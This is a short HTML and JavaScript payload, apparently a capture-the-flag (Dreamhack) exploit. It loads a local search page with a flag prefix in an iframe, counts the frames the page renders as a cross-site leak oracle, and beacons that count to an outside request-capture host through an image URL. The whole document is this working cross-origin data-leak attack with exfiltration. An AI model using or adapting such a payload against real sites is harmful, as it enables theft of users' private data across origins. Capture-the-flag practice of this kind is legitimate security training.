<iframe id="iframe"></iframe>
<img id="img">
<script>
const iframe = document.getElementById("iframe");
iframe.src="http://127.0.0.1/search?query=DH{";
iframe.onload = () => {
	img.src = `https://znhdopn.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
};
</script>	

